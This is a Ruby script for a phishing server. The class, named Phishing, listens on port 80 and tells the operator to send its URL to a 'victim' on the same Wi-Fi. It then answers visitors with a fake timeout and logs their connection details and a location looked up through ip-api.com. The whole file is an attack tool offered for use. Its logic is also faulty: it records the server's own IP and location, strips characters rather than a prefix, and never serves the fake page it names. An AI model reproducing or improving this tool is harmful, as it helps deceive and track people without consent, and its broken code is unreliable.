require 'socket'
require 'httparty'

class Phishing 
    def initialize 
        @@server = TCPServer.new 80
        @@path = "../views/fake_page.html"
    end

    def get_current_ip()
        ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
        ip.ip_address
    end

    def get_user_location()
        response = HTTParty.get("http://ip-api.com/json")
        response.body
    end
    
    def start_server()
        puts "Send this url to your victim who connected to the same Wi-Fi => http://#{self.get_current_ip}\n\n" 

        loop do
            Thread.start(@@server.accept) do |client|
                request = client.gets 
                sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr

                client.print "HTTP/1.1 200\r\n" 
                client.print "\r\n"

                client.print "Server Timeout 500"

                user_data =  <<~END
                    User Local IP Address => #{self.get_current_ip().delete("::ffff:")}
                    User Port => #{remote_port}
                    User Socket Domain => #{sock_domain}
                    User Current Location => #{self.get_user_location()}
                END

                puts user_data
                
                client.close
            end
        end
    end
end

